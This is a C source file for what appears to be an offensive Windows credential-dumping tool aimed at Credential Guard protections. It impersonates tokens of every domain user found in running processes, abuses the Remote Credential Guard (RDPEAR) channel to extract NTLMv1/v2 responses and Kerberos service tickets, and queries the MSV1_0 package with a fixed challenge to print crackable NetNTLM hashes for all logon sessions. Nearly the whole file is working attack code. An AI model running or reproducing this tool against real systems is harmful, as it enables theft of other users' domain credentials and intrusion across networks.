#include "asn1_base.h"
#include "asn1_gssapi.h"
#include "asn1_krb5.h"
#include "asn1_spnego.h"
#include "asn1_tsssp.h"

#include "tsssp_client.h"
#include "tsssp_server.h"
#include "tsssp_rdpear.h"

#ifndef _NTDEF_
#define _NTDEF_
#endif

#include <NTSecAPI.h>
#include <TlHelp32.h>
#include <sddl.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "bcrypt")
#pragma comment(lib, "crypt32")
#pragma comment(lib, "cryptdll")
#pragma comment(lib, "netapi32")
#pragma comment(lib, "ntdll")
#pragma comment(lib, "secur32")
#pragma comment(lib, "ws2_32")

typedef struct _MSV1_0_GETCHALLENRESP_REQUEST
{
	MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
#define USE_PRIMARY_PASSWORD            0x01
#define RETURN_PRIMARY_USERNAME         0x02
#define RETURN_PRIMARY_LOGON_DOMAINNAME 0x02
#define RETURN_NON_NT_USER_SESSION_KEY  0x08
#define GENERATE_CLIENT_CHALLENGE       0x10
#define GCR_NTLM3_PARMS                 0x20
#define GCR_TARGET_INFO                 0x40	// ServerName field should contains target info AV pairs
#define RETURN_RESERVED_PARAMETER       0x80	// Previously 0x10
#define GCR_ALLOW_NTLM                  0x100	// Allow the use of NTLM
#define GCR_USE_OEM_SET                 0x200	// Response will use oem character set
#define GCR_MACHINE_CREDENTIAL          0x400
#define GCR_USE_OWF_PASSWORD            0x800	// Use owf passwords
	// Windows Server XP SP2 and above
#define GCR_ALLOW_LM        0x1000 // Allow the use of LM
#define GCR_ALLOW_NO_TARGET 0x2000 // Allow no target server or target domain name
	// Windows 10 and above
#define GCR_VSM_PROTECTED_PASSWORD 0x4000 // Password is VSM protected
	ULONG ParameterControl;
	LUID LogonId;
	UNICODE_STRING Password;
	UCHAR ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
	// Remaining members are only present if ParameterControl includes GCR_NTLM3_PARMS (0x20)
	UNICODE_STRING UserName;
	UNICODE_STRING LogonDomainName;
	UNICODE_STRING ServerName; // Server domain or target info AV pairs
} MSV1_0_GETCHALLENRESP_REQUEST;

typedef struct _MSV1_0_GETCHALLENRESP_RESPONSE
{
	MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
	STRING CaseSensitiveChallengeResponse;
	STRING CaseInsensitiveChallengeResponse;
	UNICODE_STRING UserName;
	UNICODE_STRING LogonDomainName;
	UCHAR UserSessionKey[MSV1_0_USER_SESSION_KEY_LENGTH];
	UCHAR LanmanSessionKey[MSV1_0_LANMAN_SESSION_KEY_LENGTH];
} MSV1_0_GETCHALLENRESP_RESPONSE;

_Must_inspect_result_ _Ret_maybenull_ _Post_writable_byte_size_(size) 
void* __RPC_USER MIDL_user_allocate(_In_ size_t size)
{
	return LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, size);
}

void __RPC_USER MIDL_user_free(_Pre_maybenull_ _Post_invalid_ void* p)
{
	LocalFree(p);
}

BOOL is_domain_sid(PSID sid)
{
	if (!IsValidSid(sid))
		return FALSE;

	SID_IDENTIFIER_AUTHORITY* authority = GetSidIdentifierAuthority(sid);

	BYTE nt_authority[] = SECURITY_NT_AUTHORITY;

	if (memcmp(authority->Value, nt_authority, min(sizeof(authority->Value), sizeof(nt_authority))) != 0)
		return FALSE;

	if (*GetSidSubAuthorityCount(sid) < 1)
		return FALSE;

	return (*GetSidSubAuthority(sid, 0) == SECURITY_NT_NON_UNIQUE);
}

BOOL is_existing_sid(PSID sid, PSID* sid_list, DWORD sid_count)
{
	for (DWORD i = 0; i < sid_count; i++)
	{
		if (EqualSid(sid, sid_list[i]))
			return TRUE;
	}

	return FALSE;
}

BOOL add_existing_sid(PSID sid, PSID* sid_list, DWORD* sid_count)
{
	if (sid == NULL)
		return FALSE;

	PSID sid_buffer = malloc(256);

	if (sid_buffer == NULL)
		return FALSE;

	if (!CopySid(256, sid_buffer, sid))
	{
		free(sid_buffer);
		return FALSE;
	}

	sid_list[(*sid_count)++] = sid_buffer;
	return TRUE;
}

void free_existing_sids(PSID* sid_list, DWORD sid_count)
{
	for (DWORD i = 0; i < sid_count; i++)
		free(sid_list[i]);
}

extern BYTE RcgTest_SelfSignedCert[774] = 
{
	// Size (770):
	0x02, 0x03, 0x00, 0x00,
	// Data:
	0x30, 0x82, 0x02, 0xfe, 0x30, 0x82, 0x01, 0xe6, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x10, 0x18,
	0xc3, 0xbc, 0xda, 0x8f, 0x86, 0x41, 0x9b, 0x49, 0x8f, 0xcf, 0x3a, 0xe0, 0x59, 0x40, 0x7f, 0x30,
	0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x30, 0x12,
	0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x07, 0x52, 0x63, 0x67, 0x54, 0x65,
	0x73, 0x74, 0x30, 0x1e, 0x17, 0x0d, 0x32, 0x35, 0x30, 0x37, 0x33, 0x31, 0x31, 0x39, 0x31, 0x35,
	0x32, 0x34, 0x5a, 0x17, 0x0d, 0x32, 0x36, 0x30, 0x37, 0x33, 0x31, 0x31, 0x39, 0x33, 0x35, 0x32,
	0x34, 0x5a, 0x30, 0x12, 0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x07, 0x52,
	0x63, 0x67, 0x54, 0x65, 0x73, 0x74, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86,
	0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82,
	0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xd7, 0x81, 0x42, 0x0b, 0x34, 0xd4, 0xa7, 0xbb, 0x94,
	0xab, 0x1e, 0x11, 0x0f, 0x94, 0xd5, 0xf9, 0xeb, 0xc5, 0xec, 0x67, 0xf6, 0x24, 0xac, 0x24, 0x9a,
	0xec, 0x15, 0x30, 0x2e, 0x2e, 0x09, 0xe3, 0x7f, 0x3a, 0xd8, 0x3b, 0xfc, 0x99, 0x5e, 0x08, 0xc8,
	0x68, 0x7c, 0x09, 0x70, 0xf6, 0x12, 0xb4, 0xee, 0xed, 0x50, 0x4c, 0x9d, 0x90, 0xb7, 0xf9, 0xc4,
	0xfc, 0x6c, 0xea, 0x3c, 0xdd, 0x25, 0xab, 0x21, 0x08, 0xc7, 0x2c, 0x60, 0x7a, 0x4d, 0x1a, 0xd5,
	0x1b, 0x4d, 0xbb, 0x57, 0x35, 0x37, 0x51, 0x15, 0x65, 0xca, 0x55, 0xeb, 0x34, 0xaf, 0xf9, 0xa1,
	0x43, 0x94, 0xe4, 0x02, 0xd1, 0xb0, 0xe0, 0x17, 0x30, 0x7b, 0x13, 0x64, 0xc3, 0x10, 0x04, 0x19,
	0xdb, 0xb1, 0xf1, 0xa6, 0x17, 0x6f, 0xdd, 0x9d, 0x49, 0x12, 0x5c, 0xe4, 0xa7, 0x60, 0xae, 0x5c,
	0xb2, 0x24, 0xb9, 0xbd, 0x23, 0x69, 0xae, 0x7a, 0x60, 0x41, 0x5e, 0x2d, 0x9c, 0x77, 0x65, 0xa6,
	0x99, 0x6d, 0x0b, 0xb5, 0xdb, 0xed, 0x0e, 0xd1, 0x87, 0xe8, 0xc4, 0xf2, 0x5a, 0x94, 0x34, 0x1a,
	0xaa, 0xef, 0x2c, 0xee, 0x50, 0x9f, 0xb2, 0x37, 0x72, 0x7f, 0xee, 0xba, 0x3c, 0x7a, 0x46, 0xe1,
	0x8d, 0x3b, 0xfd, 0x7f, 0x3a, 0x32, 0xd2, 0x46, 0xda, 0x56, 0xa2, 0x55, 0xea, 0xfb, 0xc5, 0xa7,
	0xc8, 0xc5, 0xa5, 0xe2, 0x43, 0x3d, 0x0e, 0xad, 0x5d, 0xa6, 0x43, 0xf6, 0xea, 0xd4, 0x8c, 0x55,
	0x26, 0xce, 0xba, 0xb0, 0xaf, 0x4d, 0x20, 0x7d, 0x02, 0x92, 0xf4, 0x26, 0xa8, 0x5a, 0xe0, 0x81,
	0x39, 0xe0, 0x36, 0xfa, 0x78, 0xbd, 0x3b, 0x88, 0x95, 0xa9, 0xe0, 0xd7, 0x68, 0x23, 0x36, 0xda,
	0x1c, 0x82, 0xbc, 0x6e, 0x9c, 0xe6, 0xac, 0xe3, 0x3e, 0xb0, 0x9f, 0xb3, 0xbe, 0x06, 0x7b, 0xd9,
	0x39, 0x1f, 0xf1, 0x8c, 0x22, 0x44, 0xe5, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x50, 0x30, 0x4e,
	0x30, 0x0e, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x05, 0xa0,
	0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x16, 0x30, 0x14, 0x06, 0x08, 0x2b, 0x06, 0x01,
	0x05, 0x05, 0x07, 0x03, 0x02, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x01, 0x30,
	0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x78, 0xd0, 0xe8, 0x12, 0x1c, 0x71,
	0x2b, 0x6d, 0x5d, 0xa5, 0x0a, 0x7f, 0xad, 0xa1, 0x61, 0x66, 0x75, 0xaa, 0x3d, 0xb0, 0x30, 0x0d,
	0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x03, 0x82, 0x01,
	0x01, 0x00, 0xb1, 0x34, 0xad, 0x4a, 0x25, 0x14, 0xb9, 0xb4, 0x3c, 0x2b, 0x55, 0xd5, 0x8a, 0xd2,
	0xeb, 0xfe, 0xde, 0x16, 0x69, 0x0e, 0x24, 0x0c, 0x67, 0xa5, 0x20, 0xd7, 0x20, 0xe2, 0x2d, 0xcb,
	0x2d, 0x08, 0x32, 0x3a, 0xb3, 0x19, 0x82, 0x2f, 0xcc, 0x80, 0xe1, 0x16, 0x71, 0x23, 0xe2, 0xa5,
	0x1c, 0x0f, 0x49, 0x46, 0xae, 0x50, 0x5a, 0xa0, 0x23, 0x5a, 0x36, 0x09, 0x27, 0xa9, 0x26, 0xce,
	0xee, 0xec, 0x2a, 0xa8, 0xad, 0x70, 0xa2, 0xfe, 0x82, 0x0f, 0x27, 0x80, 0xc9, 0xf1, 0xa6, 0xc5,
	0x67, 0xad, 0x90, 0xf6, 0x51, 0x39, 0xe9, 0xb3, 0x19, 0x31, 0x2d, 0xa9, 0x6f, 0x3b, 0x5c, 0x5b,
	0x1c, 0x29, 0xde, 0x29, 0x00, 0x56, 0x4b, 0xaf, 0x42, 0x93, 0x25, 0xb7, 0xac, 0x04, 0xd1, 0x1d,
	0xbc, 0x78, 0x48, 0xda, 0x81, 0x93, 0x83, 0x5f, 0x58, 0x54, 0x1e, 0x07, 0x64, 0x75, 0x7f, 0x86,
	0xab, 0x72, 0x99, 0x30, 0x8e, 0x39, 0x01, 0x59, 0xfd, 0x52, 0x73, 0xc8, 0x13, 0x0a, 0x69, 0xcf,
	0x66, 0x90, 0xc7, 0xeb, 0x74, 0x2b, 0x02, 0x1a, 0xf0, 0x3c, 0x7e, 0x79, 0x31, 0x87, 0xc4, 0x3d,
	0x4f, 0xd6, 0x56, 0x80, 0xa4, 0xfc, 0x0d, 0x4c, 0x12, 0xdd, 0x6a, 0xb5, 0x08, 0x73, 0x13, 0x59,
	0x95, 0x36, 0xe3, 0x38, 0xf2, 0x20, 0xa4, 0x72, 0xcf, 0x4d, 0xca, 0xf2, 0xa3, 0xb0, 0xfc, 0xdc,
	0x3b, 0xc2, 0x85, 0xab, 0x53, 0x11, 0x8a, 0xdf, 0xe4, 0xbe, 0x6a, 0x05, 0x8c, 0x84, 0xe4, 0xc5,
	0x82, 0x87, 0xa1, 0x0e, 0x96, 0xb2, 0xf5, 0xbb, 0xb3, 0x22, 0x4e, 0x1c, 0x9a, 0x60, 0xc1, 0x07,
	0x02, 0xad, 0x3d, 0x75, 0x00, 0xef, 0xed, 0x4b, 0xde, 0x94, 0xd7, 0x15, 0xfb, 0x8f, 0x44, 0x25,
	0x33, 0xb2, 0x30, 0x3f, 0x30, 0x9a, 0x3a, 0x68, 0x19, 0x72, 0x76, 0x27, 0x91, 0xbe, 0x52, 0xff,
	0x0f, 0x23
};

typedef enum _DG_COMMANDS
{
	dg_comm_none = 0,
	dg_comm_ntlmv1,
	dg_comm_ntlmv2,
	dg_comm_kerb_tgs,
	dg_comm_msv1_0,
} DG_COMMANDS;

typedef enum _DG_TARGETS
{
	dg_target_none = 0,
	dg_target_self,
	dg_target_all,
} DG_TARGETS;

typedef struct _DG_ARGUMENTS
{
	DG_COMMANDS command;
	DG_TARGETS target;

	char default_spn[256];

	LPCSTR rcg_domain;
	LPCSTR rcg_username;
	LPCSTR rcg_password;
	LPCSTR rcg_spn;

	LPCSTR kerb_domain;
	LPCSTR kerb_spn;
} DG_ARGUMENTS;

BOOL validate_arguments(DG_ARGUMENTS* args)
{
	if (args->command == dg_comm_none)
	{
		puts("[-] You must select a command ('/command:ntlmv1', '/command:ntlmv2', '/command:kerbtgs', or '/command:msv10')");
		return FALSE;
	}

	if (args->command != dg_comm_msv1_0)
	{
		if (args->target == dg_target_none)
		{
			puts("[-] You must select a target ('/target:self' or '/target:all')");
			return FALSE;
		}

		if (args->rcg_domain == NULL || args->rcg_username == NULL || args->rcg_password == NULL)
		{
			puts("[-] You must specify target credentials ('/domain:<domain>', '/username:<username>', and '/password:<password>')");
			return FALSE;
		}

		if (args->rcg_spn == NULL)
		{
			if (strchr(args->rcg_username, '$') == NULL)
			{
				puts("[-] You must specify a service principal name for non-computer principals ('/spn:<spn>')");
				return FALSE;
			}

			strcpy_s(args->default_spn, sizeof(args->default_spn), "HOST/");
			strcat_s(args->default_spn, sizeof(args->default_spn), args->rcg_username);

			LPSTR sign = strchr(args->default_spn, '$');

			if (sign != NULL)
				*sign = '\0';

			printf("[*] No service principal name specified, defaulting to: '%s'\n", args->default_spn);

			args->rcg_spn = args->default_spn;
		}

		if (args->command == dg_comm_kerb_tgs)
		{
			if (args->kerb_domain == NULL)
			{
				printf("[*] No kerberos TGS domain specified, defaulting to: '%s'\n", args->rcg_domain);
				args->kerb_domain = args->rcg_domain;
			}

			if (args->kerb_spn == NULL)
			{
				puts("[-] You must specify a Kerberos TGS service principal name ('/tgsspn:<spn>')");
				return FALSE;
			}
			else if (strchr(args->kerb_spn, '/') != strrchr(args->kerb_spn, '/'))
			{
				puts("[-] Malformed Kerberos TGS service principal name (only support basic format 'service/host')");
				return FALSE;
			}
		}
	}

	return TRUE;
}

BOOL parse_arguments(int argc, char* argv[], DG_ARGUMENTS* args)
{
	for (int i = 1; i < argc; i++)
	{
		LPSTR separator = strchr(argv[i], ':');

		if (separator == NULL)
		{
			printf("[-] Malformed parameter ('/key:value'): '%s'\n", argv[i]);
			return FALSE;
		}

		if (_stricmp(argv[i], "/command:ntlmv1") == 0)
			args->command = dg_comm_ntlmv1;
		else if (_stricmp(argv[i], "/command:ntlmv2") == 0)
			args->command = dg_comm_ntlmv2;
		else if (_stricmp(argv[i], "/command:kerbtgs") == 0)
			args->command = dg_comm_kerb_tgs;
		else if (_stricmp(argv[i], "/command:msv10") == 0)
			args->command = dg_comm_msv1_0;
		else if (_stricmp(argv[i], "/target:self") == 0)
			args->target = dg_target_self;
		else if (_stricmp(argv[i], "/target:all") == 0)
			args->target = dg_target_all;
		else if (_strnicmp(argv[i], "/domain", separator - argv[i]) == 0)
			args->rcg_domain = separator + 1;
		else if (_strnicmp(argv[i], "/username", separator - argv[i]) == 0)
			args->rcg_username = separator + 1;
		else if (_strnicmp(argv[i], "/password", separator - argv[i]) == 0)
			args->rcg_password = separator + 1;
		else if (_strnicmp(argv[i], "/spn", separator - argv[i]) == 0)
			args->rcg_spn = separator + 1;
		else if (_strnicmp(argv[i], "/tgsdomain", separator - argv[i]) == 0)
			args->kerb_domain = separator + 1;
		else if (_strnicmp(argv[i], "/tgsspn", separator - argv[i]) == 0)
			args->kerb_spn = separator + 1;
	}

	return validate_arguments(args);
}

BOOL perform_rcg_dump_self(DG_ARGUMENTS* args)
{
	BOOL result = FALSE;

	TSSSP_CLIENT_CONTEXT client_context;
	tsssp_client_init_context(&client_context);

	TSSSP_SERVER_CONTEXT server_context;
	tsssp_server_init_context(&server_context, args->rcg_domain, args->rcg_username, args->rcg_password);

	if (!tsssp_client_acquire_credentials(&client_context))
		puts("[-] Failed to acquire client credentials handle");
	else
	{
		SecBuffer output_buffers[1] = { 0, SECBUFFER_TOKEN, NULL };
		SecBufferDesc output_desc = { SECBUFFER_VERSION, 1, output_buffers };

		// The first buffer is the negotiation token from server
		// The second buffer is the server authentication certificate chain
		// The third buffer is a certificate OCSP response [CertSetCertificateContextProperty(CERT_OCSP_RESPONSE_PROP_ID)]

		SecBuffer input_buffers[3] = { { 0, SECBUFFER_TOKEN, NULL }, { sizeof(RcgTest_SelfSignedCert), SECBUFFER_TOKEN, RcgTest_SelfSignedCert }, { 0, SECBUFFER_TOKEN, NULL } };
		SecBufferDesc input_desc = { SECBUFFER_VERSION, 2, input_buffers };

		for (int i = 0; !client_context.authenticated || !server_context.authenticated; i++)
		{
			if (!client_context.authenticated)
			{
				output_buffers[0].pvBuffer = NULL;
				output_buffers[0].cbBuffer = 0;

				if (!tsssp_client_initialize_security_context(&client_context, args->rcg_spn, &input_desc, &output_desc))
					break;

				if (input_buffers[0].pvBuffer != NULL)
				{
					free(input_buffers[0].pvBuffer);
					input_buffers[0].pvBuffer = NULL;
				}

				input_buffers[0].cbBuffer = 0;
			}

			if (!server_context.authenticated)
			{
				ULONG cbResponse = 0;
				PVOID pvResponse = NULL;

				if (!tsssp_server_accept_security_context(&server_context, output_buffers[0].pvBuffer, output_buffers[0].cbBuffer,
					&RcgTest_SelfSignedCert[4], sizeof(RcgTest_SelfSignedCert) - 4, &pvResponse, &cbResponse))
				{
					input_buffers[0].pvBuffer = pvResponse;
					input_buffers[0].cbBuffer = cbResponse;
				}

				if (output_buffers[0].pvBuffer != NULL)
				{
					FreeContextBuffer(output_buffers[0].pvBuffer);
					output_buffers[0].pvBuffer = NULL;
				}

				output_buffers[0].cbBuffer = 0;
			}
		}

		if (client_context.authenticated && server_context.authenticated)
		{
			if (args->command == dg_comm_ntlmv1)
				result = tsssp_rdpear_send_ntlm_request_v1(&server_context, &client_context);
			else if (args->command == dg_comm_ntlmv2)
				result = tsssp_rdpear_send_ntlm_request_v2(&server_context, &client_context);
			else if (args->command == dg_comm_kerb_tgs)
				result = tsssp_rdpear_send_kerb_request_service_ticket(&server_context, &client_context, args->kerb_domain, args->kerb_spn);
		}
	}

	tsssp_server_free_context(&server_context);
	tsssp_client_free_context(&client_context);

	return result;
}

BOOL perform_rcg_dump_all(DG_ARGUMENTS* args)
{
	BOOL result = FALSE;

	PSID existing_sids[1024];
	DWORD existing_sid_count = 0;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(hSnapshot, &pe))
		{
			do
			{
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);

				if (hProcess != NULL)
				{
					HANDLE hProcessToken = NULL;
					
					if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hProcessToken))
					{
						BYTE token_data[256];
						memset(token_data, 0, sizeof(token_data));

						DWORD token_length = 0;

						if (GetTokenInformation(hProcessToken, TokenUser, token_data, sizeof(token_data), &token_length))
						{
							TOKEN_USER* token_user = (TOKEN_USER*)token_data;

							if (is_domain_sid(token_user->User.Sid) && !is_existing_sid(token_user->User.Sid, existing_sids, existing_sid_count))
							{
								HANDLE hDuplicatedToken = NULL;

								if (DuplicateToken(hProcessToken, SecurityImpersonation, &hDuplicatedToken))
								{
									if (ImpersonateLoggedOnUser(hDuplicatedToken))
									{
										LPWSTR sid_string = NULL;

										if (ConvertSidToStringSidW(token_user->User.Sid, &sid_string))
										{
											printf("[*] Impersonated %S\n", sid_string);
											LocalFree(sid_string);
										}

										if (perform_rcg_dump_self(args))
										{
											result = TRUE;

											if (existing_sid_count < _countof(existing_sids))
												add_existing_sid(token_user->User.Sid, existing_sids, &existing_sid_count);
										}

										RevertToSelf();
									}

									CloseHandle(hDuplicatedToken);
								}
							}
						}

						CloseHandle(hProcessToken);
					}

					CloseHandle(hProcess);
				}
			}
			while (Process32NextW(hSnapshot, &pe));
		}

		CloseHandle(hSnapshot);
	}

	free_existing_sids(existing_sids, existing_sid_count);
	return result;
}

BOOL perform_msv1_0_dump()
{
	BOOL result = FALSE;

	PSID existing_sids[1024];
	DWORD existing_sid_count = 0;

	ULONG session_count = 0;
	PLUID session_list = NULL;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&session_count, &session_list)))
	{
		for (ULONG i = 0; i < session_count; i++)
		{
			SECURITY_LOGON_SESSION_DATA* session_data = NULL;

			if (NT_SUCCESS(LsaGetLogonSessionData(&session_list[i], &session_data)))
			{
				if (is_domain_sid(session_data->Sid) && !is_existing_sid(session_data->Sid, existing_sids, existing_sid_count))
				{
					LPWSTR sid_string = NULL;

					if (ConvertSidToStringSidW(session_data->Sid, &sid_string))
					{
						printf("[*] Attempting to dump %S (%.*S)\n", sid_string, (int)(session_data->UserName.Length / sizeof(wchar_t)), session_data->UserName.Buffer);
						LocalFree(sid_string);
					}

					HANDLE lsa_handle = NULL;

					if (NT_SUCCESS(LsaConnectUntrusted(&lsa_handle)))
					{
						LSA_STRING package_name;
						memset(&package_name, 0, sizeof(package_name));

						package_name.Buffer = (char*)MSV1_0_PACKAGE_NAME;
						package_name.Length = (USHORT)strlen(package_name.Buffer);
						package_name.MaximumLength = package_name.Length;

						ULONG package_id = 0;

						if (NT_SUCCESS(LsaLookupAuthenticationPackage(lsa_handle, &package_name, &package_id)))
						{
							MSV1_0_GETCHALLENRESP_REQUEST request;
							memset(&request, 0, sizeof(request));

							request.MessageType = MsV1_0Lm20GetChallengeResponse;
							request.ParameterControl = RETURN_PRIMARY_USERNAME | RETURN_PRIMARY_LOGON_DOMAINNAME | USE_PRIMARY_PASSWORD | GCR_VSM_PROTECTED_PASSWORD;
							
							memcpy(&request.LogonId, &session_data->LogonId, sizeof(LUID));
							memcpy(&request.ChallengeToClient[0], "\x11\x22\x33\x44\x55\x66\x77\x88", 8);

							ULONG cbOutput = 0;
							PVOID pvOutput = NULL;

							NTSTATUS protocol_status = 0;

							if (NT_SUCCESS(LsaCallAuthenticationPackage(lsa_handle, package_id, &request, sizeof(request), &pvOutput, &cbOutput, &protocol_status)))
							{
								if (!NT_SUCCESS(protocol_status))
								{
									LPSTR message = NULL;
									DWORD message_length = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, protocol_status, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&message, 0, NULL);

									if (message != NULL && message_length != 0)
									{
										printf("Failed with error: 0x%08x (%s)\n", protocol_status, message);
										LocalFree(message);
									}
									else
									{
										printf("Failed with unknown error: 0x%08x\n", protocol_status);
									}
								}
								else if (pvOutput != NULL)
								{
									MSV1_0_GETCHALLENRESP_RESPONSE* response = (MSV1_0_GETCHALLENRESP_RESPONSE*)pvOutput;

									if (cbOutput >= sizeof(MSV1_0_GETCHALLENRESP_RESPONSE))
									{
										printf("%.*S::::", (int)(session_data->UserName.Length / sizeof(wchar_t)), session_data->UserName.Buffer);

										if (response->CaseSensitiveChallengeResponse.Length >= 24)
										{
											for (int i = 0; i < response->CaseSensitiveChallengeResponse.Length; i++)
												printf("%02x", (BYTE)response->CaseSensitiveChallengeResponse.Buffer[i]);
										}
										else if (response->CaseInsensitiveChallengeResponse.Length >= 24)
										{
											for (int i = 0; i < response->CaseInsensitiveChallengeResponse.Length; i++)
												printf("%02x", (BYTE)response->CaseInsensitiveChallengeResponse.Buffer[i]);
										}

										printf(":");

										for (int i = 0; i < sizeof(request.ChallengeToClient); i++)
											printf("%02x", request.ChallengeToClient[i]);

										printf("\n");

										result = TRUE;

										if (existing_sid_count < _countof(existing_sids))
											add_existing_sid(session_data->Sid, existing_sids, &existing_sid_count);
									}

									LsaFreeReturnBuffer(pvOutput);
								}
							}
						}

						LsaDeregisterLogonProcess(lsa_handle);
					}
				}

				LsaFreeReturnBuffer(session_data);
			}
		}

		LsaFreeReturnBuffer(session_list);
	}

	free_existing_sids(existing_sids, existing_sid_count);
	return result;
}

int main(int argc, char* argv[])
{
	DG_ARGUMENTS args;
	memset(&args, 0, sizeof(args));

	if (!parse_arguments(argc, argv, &args))
		return 1;

	int err_code = 1;

	if (args.command == dg_comm_msv1_0)
	{
		if (perform_msv1_0_dump())
			err_code = 0;
	}
	else if (asn1_initialize_module() && asn1_startup_tsssp() && asn1_startup_spnego() && asn1_startup_gssapi() && asn1_startup_krb5())
	{
		srand((unsigned int)time(NULL));

		if (args.target == dg_target_self)
		{
			if (perform_rcg_dump_self(&args))
				err_code = 0;
		}
		else if (args.target == dg_target_all)
		{
			if (perform_rcg_dump_all(&args))
				err_code = 0;
		}

		asn1_cleanup_krb5();
		asn1_cleanup_gssapi();
		asn1_cleanup_spnego();
		asn1_cleanup_tsssp();
	}

	return err_code;
}